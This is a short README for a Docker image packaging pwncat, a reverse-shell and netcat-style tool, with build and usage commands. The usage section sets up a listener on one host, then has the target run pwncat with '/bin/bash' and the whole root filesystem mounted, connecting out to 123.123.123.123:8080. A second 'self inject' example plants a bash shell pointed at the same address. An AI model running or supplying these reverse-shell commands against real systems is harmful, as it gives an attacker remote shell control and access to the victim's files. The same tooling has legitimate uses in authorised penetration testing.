# pwncatdocker
Docker image for pwncat

## Build
```
docker build -t adioss/pwncat .
```

## Usage

### pwncat basic connection
```
// on host with ip adress 123.123.123.123, we will wait for connection to have a shell on remote (-l: listen, -k: re-accept new clients)
docker run -ti --rm --network=host adioss/pwncat -l 8080 -k -vv
// equivalent to: docker run -ti --rm --network=host subfuzion/netcat -vl 8080

// target (connects to ip adress '123.123.123.123')
docker run -ti --rm -v /:/mnt -w=/mnt adioss/pwncat -e '/bin/bash' 123.123.123.123 8080  
```


### pwncat self inject connection
```
// source
docker run -ti --rm --network=host adioss/pwncat -l 8080 --self-inject /bin/bash:123.123.123.123:8080

// target (connects to ip adress '123.123.123.123')
nc 123.123.123.123 8080
```